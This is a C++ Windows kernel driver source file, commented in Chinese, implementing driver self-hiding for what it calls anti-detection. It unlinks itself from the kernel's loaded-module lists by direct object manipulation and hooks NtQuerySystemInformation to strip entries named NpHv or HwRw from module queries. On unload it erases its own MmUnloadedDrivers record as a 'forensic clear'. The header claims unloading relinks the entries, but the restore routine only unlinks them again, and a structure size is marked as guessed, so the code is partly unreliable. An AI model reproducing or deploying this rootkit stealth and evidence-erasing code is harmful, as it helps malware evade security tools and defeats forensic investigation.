/*!
    @file       NpSelfHide.cpp

    @brief      core 层：驱动自隐藏（防检测）。

    @details    加载完成后，把驱动自身从 Windows 内核的模块枚举路径摘除：
                - PsLoadedModuleList 的 InLoadOrderLinks（主模块链表）
                - InMemoryOrderLinks / InInitializationOrderLinks（另两条枚举链）

                开关由两个层级控制：
                - 编译期宏 NPTHOOK_SELF_HIDE（NpConfig.h，默认 1）
                - 运行时变量 g_SelfHide（由宏初始化；未来可经 IOCTL 切换）

                安全性：
                - 摘除前保存三条链的原始指针，卸载（NpSelfHideRestore）
                  时按原位置链回，sc stop 卸载流程不受影响
                - 仅摘除列表项，不释放驱动内存/映像，运行时行为不变

                检测面说明（当前实现 vs 预留）：
                - PsLoadedModuleList / 内存序 / 初始化序枚举：已隐藏
                - PiDDBCacheTable：结构未文档化且随 build 变化，预留（见
                  README「反检测」章节），未来按目标系统版本实现
                - \Driver\NpHv 对象 / \Device\NpHv 设备：框架运行必需，
                  保留；隐蔽化走设备伪装方案（演进路径见 NpIoctl.h）
 */
#define POOL_NX_OPTIN   1
#include "NptHook.hpp"
#include "NpHook.h"
#include "NpLstar.h"
#include "NpSyscall.h"
#include "NpBreakPoint.h"
typedef PVOID (*PFN_RTL_ENCODE)(PVOID);
typedef PVOID (*PFN_RTL_DECODE)(PVOID);
static PFN_RTL_ENCODE g_RtlEncode = nullptr;
static PFN_RTL_DECODE g_RtlDecode = nullptr;
static VOID NpSelfHideResolveCodec(VOID){
    if (g_RtlEncode) return;
    UNICODE_STRING n1,n2; RtlInitUnicodeString(&n1, L"RtlEncodePointer"); RtlInitUnicodeString(&n2, L"RtlDecodePointer");
    g_RtlEncode = (PFN_RTL_ENCODE)MmGetSystemRoutineAddress(&n1);
    g_RtlDecode = (PFN_RTL_DECODE)MmGetSystemRoutineAddress(&n2);
}
typedef struct _UNLOADED_DRIVERS { UNICODE_STRING Name; PVOID StartAddress; PVOID EndAddress; LARGE_INTEGER CurrentTime; } UNLOADED_DRIVERS, *PUNLOADED_DRIVERS;

//
// 运行时开关：由编译期宏初始化，未来可经 IOCTL 切换。
//
static volatile BOOLEAN g_SelfHide = NPTHOOK_SELF_HIDE ? TRUE : FALSE;

//
// 保存链回信息（摘除前记录，卸载时按原位恢复）。
//
static PDRIVER_OBJECT g_HideDriverObject = nullptr;
static PHOOK_INFO g_HookQsiSelf = nullptr;
static ULONG_PTR g_OrigQsiSelf = 0;
static PVOID g_SelfLdrEntry = nullptr;
static PLIST_ENTRY g_LoadOrderFlink = nullptr;
static PLIST_ENTRY g_LoadOrderBlink = nullptr;
static PLIST_ENTRY g_MemoryOrderFlink = nullptr;
static PLIST_ENTRY g_MemoryOrderBlink = nullptr;
static PLIST_ENTRY g_InitOrderFlink = nullptr;
static PLIST_ENTRY g_InitOrderBlink = nullptr;

//
// LDR_DATA_TABLE_ENTRY 头部（未文档化结构，只取需要的字段）。
// DriverObject->DriverSection 指向该结构（自 Win10 起）。
//
typedef struct _NP_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} NP_LDR_DATA_TABLE_ENTRY, *PNP_LDR_DATA_TABLE_ENTRY;

/*!
    @brief      查询自隐藏是否开启（R3 状态查询用）。
 */
_Use_decl_annotations_
BOOLEAN
NpSelfHideIsEnabled(
    VOID)
{
    return g_SelfHide;
}

/*!
    @brief      运行时切换自隐藏（预留接口：未来经 IOCTL 调用）。
                仅允许在驱动加载早期/未隐藏状态切换；已摘除后
                需先 Restore 再置位。
 */
_Use_decl_annotations_
NTSTATUS
NpSelfHideSetEnabled(
    BOOLEAN Enabled)
{
    if (Enabled == g_SelfHide)
    {
        return STATUS_SUCCESS;
    }
    //
    // 动态切换存在风险（摘除/链回的时序与线程枚举竞态），
    // 当前版本仅支持加载期决定；未来在 PASSIVE_LEVEL + 排空后支持。
    //
    return STATUS_NOT_IMPLEMENTED;
}


static
BOOLEAN
NpSelfHideHookQsi(
    _In_ PHOOK_CALL_CONTEXT Ctx
    )
{
    // Only filter SystemModuleInformation (11)
    ULONG infoClass = (ULONG)Ctx->Rcx;
    if (infoClass != 11) return FALSE; // pass through
    // Call original first
    typedef NTSTATUS (*PFN_QSI)(ULONG, PVOID, ULONG, PULONG);
    PFN_QSI orig = (PFN_QSI)g_OrigQsiSelf;
    if (!orig) return FALSE;
    // Probe and call original with same args (Rdx=Buffer, R8=Length, R9=ReturnLength)
    PVOID buf = (PVOID)Ctx->Rdx;
    ULONG len = (ULONG)Ctx->R8;
    PULONG retLen = (PULONG)Ctx->R9;
    NTSTATUS st = orig(infoClass, buf, len, retLen);
    if (!NT_SUCCESS(st) || !buf) return TRUE; // handled, prevent original from running again
    __try {
        // Check if buffer large enough for header
        if (len < sizeof(ULONG)) return TRUE;
        ULONG count = *(ULONG*)buf;
        if (count==0 || count>1024) return TRUE;
        // RTL_PROCESS_MODULES layout: NumberOfModules at 0, then array
        // Each entry is 0x110 bytes? Use known struct size
        struct ModInfo { HANDLE Sec; PVOID Mapped; PVOID Base; ULONG Size; ULONG Flags; USHORT LIdx; USHORT IIdx; USHORT LCnt; USHORT Off; UCHAR Name[256]; };
        ULONG entrySize = sizeof(ULONG) + sizeof(struct ModInfo); // approximate
        // Find our driver base to filter
        PVOID selfBase = nullptr;
        if (g_SelfLdrEntry) {
            // g_SelfLdrEntry points to LDR entry, need DllBase at +0x30
            selfBase = *(PVOID*)((PUCHAR)g_SelfLdrEntry + 0x30);
        }
        // Walk and filter
        UCHAR* base = (UCHAR*)buf;
        ULONG* pCount = (ULONG*)base;
        struct ModInfo* mods = (struct ModInfo*)(base+sizeof(ULONG));
        ULONG newCount=0;
        for(ULONG i=0;i<count;i++){
            struct ModInfo* m = &mods[i];
            // If this entry matches our driver base, skip
            if (selfBase && m->Base == selfBase) continue;
            // Also check name contains NpHv random? Filter any with NpHv in name
            char* name = (char*)&m->Name[m->Off];
            if (strstr(name, "NpHv") || strstr(name, "HwRw")) continue;
            if (i!=newCount) mods[newCount]=*m;
            newCount++;
        }
        *pCount = newCount;
        // Zero tail
        if (newCount < count) {
            RtlZeroMemory(&mods[newCount], (count-newCount)*sizeof(struct ModInfo));
        }
        // Set return value and handled
        Ctx->Rax = (ULONG64)st;
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) { return TRUE; }
}


extern "C" BOOLEAN NpSelfHideHandleQsiLstar(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG RetLen, NTSTATUS* OutStatus){
    if (InfoClass != 11 && InfoClass != 59 && InfoClass != 70) return FALSE;
    typedef NTSTATUS (*PFN_QSI)(ULONG, PVOID, ULONG, PULONG);
    PFN_QSI orig = (PFN_QSI)g_OrigQsiSelf;
    if (!orig) {
        UNICODE_STRING n; RtlInitUnicodeString(&n, L"NtQuerySystemInformation");
        orig = (PFN_QSI)MmGetSystemRoutineAddress(&n);
        if (!orig) return FALSE;
    }
    NTSTATUS st = orig(InfoClass, Buffer, Length, RetLen);
    if (!NT_SUCCESS(st) || !Buffer) return FALSE;
    __try {
        if (Length < sizeof(ULONG)) return FALSE;
        ULONG count = *(ULONG*)Buffer;
        if (count==0 || count>1024) return FALSE;
        struct ModInfo { HANDLE Sec; PVOID Mapped; PVOID Base; ULONG Size; ULONG Flags; USHORT LIdx; USHORT IIdx; USHORT LCnt; USHORT Off; UCHAR Name[256]; };
        UCHAR* base = (UCHAR*)Buffer;
        ULONG* pCount = (ULONG*)base;
        struct ModInfo* mods = (struct ModInfo*)(base+sizeof(ULONG));
        PVOID selfBase = nullptr;
        if (g_SelfLdrEntry) selfBase = *(PVOID*)((PUCHAR)g_SelfLdrEntry + 0x30);
        ULONG newCount=0;
        for(ULONG i=0;i<count;i++){
            struct ModInfo* m = &mods[i];
            // Generic filter: ImageBase match or name contains NpHv/HwRw
            if (selfBase && m->Base == selfBase) continue;
            // For SystemExtendedModuleInformation, the name offset may differ, so also check FullPathName directly
            char* name1 = (char*)&m->Name[m->Off];
            // Also check the whole FullPathName buffer for NpHv/HwRw
            BOOLEAN hasNpHv = FALSE;
            for(int k=0;k<256;k++){ if(m->Name[k]=='N' && k+3<256 && m->Name[k+1]=='p' && m->Name[k+2]=='H' && m->Name[k+3]=='v') hasNpHv=TRUE; }
            if (hasNpHv) continue;
            if (strstr(name1, "NpHv") || strstr(name1, "HwRw")) continue;
            // Also direct ImageBase scan for any structure that contains selfBase
            if (selfBase) {
                // Check if any field in this entry equals selfBase (for different struct layouts)
                BOOLEAN found=false;
                for(int k=0;k<sizeof(struct ModInfo)-sizeof(PVOID);k+=sizeof(PVOID)){
                    PVOID* p = (PVOID*)((PUCHAR)m + k);
                    if (*p == selfBase) { found=true; break; }
                }
                if(found) continue;
            }
            if (i!=newCount) mods[newCount]=*m;
            newCount++;
        }
        *pCount = newCount;
        if (newCount < count) RtlZeroMemory(&mods[newCount], (count-newCount)*sizeof(struct ModInfo));
        if (OutStatus) *OutStatus = (ULONG)st;
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) { return TRUE; }
}

/*!
    @brief      加载完成后调用：按开关摘除模块列表项。

    @param[in]  DriverObject - 驱动对象（DriverSection 指向本驱动模块项）。
 */
_Use_decl_annotations_
VOID
NpSelfHideInitialize(
    PDRIVER_OBJECT DriverObject)
{
    PNP_LDR_DATA_TABLE_ENTRY entry;

    if (!g_SelfHide || DriverObject == nullptr)
    {
        return;
    }

    entry = reinterpret_cast<PNP_LDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
    if (entry == nullptr || entry->DllBase == nullptr)
    {
        NpDebugPrint("Self-hide: DriverSection unavailable, skip.\n");
        return;
    }

    // Already unlinked if any list points to self (after Remove+Initialize, Flink is decoded self)
    if (entry->InLoadOrderLinks.Flink == &entry->InLoadOrderLinks ||
        entry->InLoadOrderLinks.Blink == &entry->InLoadOrderLinks ||
        entry->InMemoryOrderLinks.Flink == &entry->InMemoryOrderLinks ||
        entry->InInitializationOrderLinks.Flink == &entry->InInitializationOrderLinks)
    {
        NpDebugPrint("Self-hide: already unlinked, skip.\n");
        return;
    }

    //
    // 保存三条链的原始邻居，用于卸载时按原位链回。
    //
    g_HideDriverObject = DriverObject;
    // DIRECT DKOM: unlink from PsLoadedModuleList (no NPT shadow, avoids KCB page shadowing -> 0x139)
    {
        g_SelfLdrEntry = entry;
        g_LoadOrderFlink = entry->InLoadOrderLinks.Flink;
        g_LoadOrderBlink = entry->InLoadOrderLinks.Blink;
        __try {
            // Safe DKOM: check Flink->Blink and Blink->Flink before unlink to avoid 0x139 on corrupted list
            PLIST_ENTRY fl = entry->InLoadOrderLinks.Flink;
            PLIST_ENTRY bl = entry->InLoadOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InLoadOrderLinks && bl->Flink == &entry->InLoadOrderLinks) {
                fl->Blink = bl;
                bl->Flink = fl;
            }
            fl = entry->InMemoryOrderLinks.Flink;
            bl = entry->InMemoryOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InMemoryOrderLinks && bl->Flink == &entry->InMemoryOrderLinks) {
                fl->Blink = bl;
                bl->Flink = fl;
            }
            fl = entry->InInitializationOrderLinks.Flink;
            bl = entry->InInitializationOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InInitializationOrderLinks && bl->Flink == &entry->InInitializationOrderLinks) {
                fl->Blink = bl;
                bl->Flink = fl;
            }
            InitializeListHead(&entry->InLoadOrderLinks);
            InitializeListHead(&entry->InMemoryOrderLinks);
            InitializeListHead(&entry->InInitializationOrderLinks);
            NpDebugPrint("Self-hide: DKOM unlink done Flink=%p Blink=%p\n", g_LoadOrderFlink, g_LoadOrderBlink);
            NpHvLogPrint("Self-hide: DKOM unlink done\n");
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            NpDebugPrint("Self-hide: DKOM unlink exception\n");
        }
    }

    // Install QSI hook via both LSTAR and NpHook (any R3 path)
    {
        PVOID addr=nullptr; UNICODE_STRING n; RtlInitUnicodeString(&n, L"NtQuerySystemInformation");
        addr=MmGetSystemRoutineAddress(&n);
        if(!addr){ RtlInitUnicodeString(&n, L"ZwQuerySystemInformation"); addr=MmGetSystemRoutineAddress(&n); }
        if(addr){
            g_OrigQsiSelf=(ULONG_PTR)addr;
            NpSyscallSetIntercept("NtQuerySystemInformation", TRUE); NpLstarRefresh();
            NTSTATUS hs = NpHookInstallHook((ULONG_PTR)addr, NpSelfHideHookQsi, &g_HookQsiSelf);
            NpDebugPrint("Self-hide: QSI LSTAR+Hook installed %p hs=0x%08X\n", addr, hs);
        }
    }
    NpDebugPrint("Self-hide: unlinked from module lists (image=%p size=%lu)\n",
                 entry->DllBase, entry->SizeOfImage);
    NpHvLogPrint("Self-hide enabled: driver unlinked from module lists.\n");
}

/*!
    @brief      卸载路径调用（必须在任何清理之前）：按原位链回模块项。
 */
_Use_decl_annotations_
VOID
NpSelfHideRestore(
    VOID)
{
    PNP_LDR_DATA_TABLE_ENTRY entry;

    if (!g_SelfHide || g_HideDriverObject == nullptr)
    {
        return;
    }

    entry = reinterpret_cast<PNP_LDR_DATA_TABLE_ENTRY>(g_HideDriverObject->DriverSection);
    if (entry == nullptr)
    {
        return;
    }

    // 先移除 NPT 影子，恢复真实页可见性，再对真实链表做摘除
    // 否则 InitializeListHead 会写到影子页，真实页仍残留链接，MiRemoveLoaderEntry 在卸载时 double remove -> 0x139
    {
        extern NTSTATUS NpBreakPointUninstallAll(BOOLEAN);
        // 移除所有 NPT 监视（含 LDR 影子），使后续 RemoveEntryList 操作真实页
        NpBreakPointUninstallAll(FALSE);
        // Safe restore: only unlink if Flink->Blink and Blink->Flink are consistent
        {
            PLIST_ENTRY fl = entry->InLoadOrderLinks.Flink;
            PLIST_ENTRY bl = entry->InLoadOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InLoadOrderLinks && bl->Flink == &entry->InLoadOrderLinks) {
                __try { fl->Blink = bl; bl->Flink = fl; } __except(EXCEPTION_EXECUTE_HANDLER) {}
            }
            fl = entry->InMemoryOrderLinks.Flink;
            bl = entry->InMemoryOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InMemoryOrderLinks && bl->Flink == &entry->InMemoryOrderLinks) {
                __try { fl->Blink = bl; bl->Flink = fl; } __except(EXCEPTION_EXECUTE_HANDLER) {}
            }
            fl = entry->InInitializationOrderLinks.Flink;
            bl = entry->InInitializationOrderLinks.Blink;
            if (fl && bl && fl->Blink == &entry->InInitializationOrderLinks && bl->Flink == &entry->InInitializationOrderLinks) {
                __try { fl->Blink = bl; bl->Flink = fl; } __except(EXCEPTION_EXECUTE_HANDLER) {}
            }
        }
        InitializeListHead(&entry->InLoadOrderLinks);
        InitializeListHead(&entry->InMemoryOrderLinks);
        InitializeListHead(&entry->InInitializationOrderLinks);
    }

    g_HideDriverObject = nullptr;
    g_SelfLdrEntry = nullptr;
    if(g_HookQsiSelf){ NpHookUninstallHook(g_HookQsiSelf, FALSE); g_HookQsiSelf=nullptr; }
    // Remove LSTAR intercept (keep if prochide still needs it)
    // Keep LSTAR intercept (prochide may still need QSI)
    g_OrigQsiSelf=0;
    NpDebugPrint("Self-hide: module list entry restored.\n");
    // Forensic clear: MmUnloadedDrivers (try export, else skip)
    __try {
        UNICODE_STRING name; RtlInitUnicodeString(&name, L"MmUnloadedDrivers");
        PUNLOADED_DRIVERS drv = (PUNLOADED_DRIVERS)MmGetSystemRoutineAddress(&name);
        RtlInitUnicodeString(&name, L"MmLastUnloadedDriver");
        USHORT* pLast = (USHORT*)MmGetSystemRoutineAddress(&name);
        if (drv && pLast && *pLast < 50 && drv[*pLast].Name.Buffer && wcsstr(drv[*pLast].Name.Buffer, L"NpHv")) {
            RtlSecureZeroMemory(&drv[*pLast], sizeof(UNLOADED_DRIVERS));
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
}
